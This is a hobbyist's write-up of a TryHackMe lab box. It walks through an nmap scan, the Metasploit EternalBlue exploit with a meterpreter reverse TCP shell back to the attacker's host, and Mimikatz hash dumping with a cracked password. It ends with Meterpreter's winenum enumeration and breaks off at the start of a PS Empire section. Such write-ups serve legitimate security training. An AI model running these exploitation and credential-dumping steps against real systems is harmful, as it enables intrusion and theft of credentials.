# PS Empire

This is my 2nd TryHackMe box! *Enable Hackerman mode*

## Service Enumeration

```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-10 17:53 MDT
Nmap scan report for 10.10.231.250
Host is up (0.19s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: JON-PC
|   NetBIOS_Domain_Name: JON-PC
|   NetBIOS_Computer_Name: JON-PC
|   DNS_Domain_Name: Jon-PC
|   DNS_Computer_Name: Jon-PC
|   Product_Version: 6.1.7601
|_  System_Time: 2020-07-10T23:54:59+00:00
| ssl-cert: Subject: commonName=Jon-PC
| Not valid before: 2020-07-09T23:53:34
|_Not valid after:  2021-01-08T23:53:34
|_ssl-date: 2020-07-10T23:55:05+00:00; 0s from scanner time.
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49159/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h00m00s, deviation: 2h14m10s, median: 0s
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:27:e5:64:9e:da (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-07-10T18:54:59-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-07-10T23:54:59
|_  start_date: 2020-07-10T23:53:32

```

TONS of information here! We can see a slew of open ports running various services, and with the -sC flag, we are able to run a basic nmap script scan that comes by default. 

## Exploitation

I jumped the gun and was curious to see what exploits Windows 7 Build 7601 are available:

```bash
➜  ~ searchsploit Windows 7 7601
------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                         |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Microsoft Authorization Manager 6.1.7601 - 'azman' XML External Entity Injection                                                                       | windows/local/40859.txt
Microsoft MSINFO32.EXE 6.1.7601 - '.NFO' XML External Entity Injection                                                                                 | windows/local/40864.txt
Microsoft Windows 7 build 7601 (x86) - Local Privilege Escalation                                                                                      | windows/local/47176.cpp
MuPDF < 20091125231942 - 'pdf_shade4.c' Multiple Stack Buffer Overflows                                                                                | windows/local/10244.txt
Omnicom Alpha 4.0e LPD Server - Denial of Service                                                                                                      | windows/dos/17601.py
------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```


I decided to look up the infamous EternalBlue exploit and see if it would work on this box simply due to the build number and OS being over a decade old. I had to try it!!!

I loaded up metasploit, searched for eternalblue, pointed my lazers at 10.10.81.233 and fired!

```bash
msf5 > search eternalblue

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index, for example use 5 or use exploit/windows/smb/smb_doublepulsar_rce

msf5 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf5 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.81.233
rhosts => 10.10.81.233
msf5 exploit(windows/smb/ms17_010_eternalblue) > rhosts => 10.10.81.233
[-] Unknown command: rhosts.
msf5 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf5 exploit(windows/smb/ms17_010_eternalblue) > set lhost 10.2.27.38
lhost => 10.2.27.38
msf5 exploit(windows/smb/ms17_010_eternalblue) > set lport 1337
lport => 1337
msf5 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.2.27.38:1337 
[*] 10.10.81.233:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.81.233:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.81.233:445      - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.81.233:445 - Connecting to target for exploitation.
[+] 10.10.81.233:445 - Connection established for exploitation.
[+] 10.10.81.233:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.81.233:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.81.233:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.81.233:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.81.233:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.81.233:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.81.233:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.81.233:445 - Sending all but last fragment of exploit packet
[*] 10.10.81.233:445 - Starting non-paged pool grooming
[+] 10.10.81.233:445 - Sending SMBv2 buffers
[+] 10.10.81.233:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.81.233:445 - Sending final SMBv2 buffers.
[*] 10.10.81.233:445 - Sending last fragment of exploit packet!
[*] 10.10.81.233:445 - Receiving response from exploit packet
[+] 10.10.81.233:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.81.233:445 - Sending egg to corrupted connection.
[*] 10.10.81.233:445 - Triggering free of corrupted buffer.
[*] Sending stage (201283 bytes) to 10.10.81.233
[*] Meterpreter session 1 opened (10.2.27.38:1337 -> 10.10.81.233:49171) at 2020-07-10 19:56:00 -0600
[+] 10.10.81.233:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.81.233:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.81.233:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > sysinfo
Computer        : JON-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x64/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 
```
## Post Exploitation/Privilege Escalation:

Now that we have a meterpreter session going, lets try to escalate priviledges with Mimikatz:

```bash
meterpreter > load mimikatz
Loading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7 (6.1 Build 7601, Service Pack 1).). Did you mean to 'load kiwi' instead?
Success.
meterpreter > mimikatz_command -f version
mimikatz 1.0 x64 (RC) (Jun 26 2020 21:27:49)
meterpreter > msv
[+] Running as SYSTEM
[*] Retrieving msv credentials
msv credentials
===============

AuthID   Package    Domain        User           Password
------   -------    ------        ----           --------
0;997    Negotiate  NT AUTHORITY  LOCAL SERVICE  n.s. (Credentials KO)
0;996    Negotiate  WORKGROUP     JON-PC$        n.s. (Credentials KO)
0;22657  NTLM                                    n.s. (Credentials KO)
0;999    NTLM       WORKGROUP     JON-PC$        n.s. (Credentials KO)
meterpreter > mimikatz_command -f samdump::hashes
Ordinateur : Jon-PC
BootKey    : 55bd17830e678f18a3110daf2c17d4c7

Rid  : 500
User : Administrator
LM   : 
NTLM : 31d6cfe0d16ae931b73c59d7e0c089c0

Rid  : 501
User : Guest
LM   : 
NTLM : 

Rid  : 1000
User : Jon
LM   : 
NTLM : ffb43f0de35be4d9917ac0cc8ad57f8d
```

We have some hashes that need to be cracked! I tried plugging them into a reverse MD5 site to no avail. I just happened to stumble upon crackstation, a website that lets you plug in a variety of hashes, including our NTLM hashes. User ```Jon```'s password was ```alqfna22```, but our Administrator's password was the interesting one, which turned out to be simply a blank password. Doing a little digging, this hash reveals to us that the local admin account is disabled. Saad face. 


I guess I should have read more about ```NT AUTHORITY\SYSTEM``` and how it is basically the ```root``` of the Windows world. I had already pwned this box, but I guess I was just having fun trying to see what else I could find now that I was ```"root"```. And so we shall:

```bash
meterpreter > run winenum
[*] Running Windows Local Enumeration Meterpreter Script
[*] New session on 10.10.105.201:445...
[*] Saving general report to /Users/titanium/.msf4/logs/scripts/winenum/JON-PC_20200711.4713/JON-PC_20200711.4713.txt
[*] Output of each individual command is saved to /Users/titanium/.msf4/logs/scripts/winenum/JON-PC_20200711.4713
[*] Checking if JON-PC is a Virtual Machine ........
[*] 	This is a Xen Virtual Machine.
[*] 	UAC is Disabled
[*] Running Command List ...
[*] 	running command cmd.exe /c set
[*] 	running command arp -a
[*] 	running command ipconfig /all
[*] 	running command ipconfig /displaydns
[*] 	running command net view
[*] 	running command netstat -nao
[*] 	running command route print
[*] 	running command netstat -vb
[*] 	running command netstat -ns
[*] 	running command net accounts
[*] 	running command net share
[*] 	running command net group
[*] 	running command net group administrators
[*] 	running command net view /domain
[*] 	running command net localgroup
[*] 	running command net localgroup administrators
[*] 	running command net user
[*] 	running command netsh firewall show config
[*] 	running command tasklist /svc
[*] 	running command net session
[*] 	running command netsh wlan show drivers
[*] 	running command gpresult /SCOPE COMPUTER /Z
[*] 	running command netsh wlan show networks mode=bssid
[*] 	running command netsh wlan show interfaces
[*] 	running command netsh wlan show profiles
[*] 	running command gpresult /SCOPE USER /Z
[*] Running WMIC Commands ....
[*] 	running command wmic useraccount list
[*] 	running command wmic group list
[*] 	running command wmic service list brief
[*] 	running command wmic volume list brief
[*] 	running command wmic netlogin get name,lastlogon,badpasswordcount
[*] 	running command wmic netuse get name,username,connectiontype,localname
[*] 	running command wmic netclient list brief
[*] 	running command wmic logicaldisk get description,filesystem,name,size
[*] 	running command wmic nteventlog get path,filename,writeable
[*] 	running command wmic share get name,path
[*] 	running command wmic startup list full
[*] 	running command wmic rdtoggle list
[*] 	running command wmic product get name,version
[*] 	running command wmic qfe
[*] Extracting software list from registry
[*] Dumping password hashes...
[*] Hashes Dumped
[*] Getting Tokens...
[*] All tokens have been processed
[*] Done!
```

Meterpreter has one hell of a powerful post exploitation command, ```winenum``` which as you can see above, basically dumps almost all information you could want from a Windows machine from local accounts, local admin accounts, session information, firewall configs, ```ipconfig``` outputs, wireless interfaces, drivers for those interfaces, environment variables, dumped more password hashes, extracted tokens, the list keeps going on and on...

## PS (PowerShell) Empire

The point of this box was to get dirty with the PS Empire framework. Lets get started:

1) Which menu to we launch to access listeners?


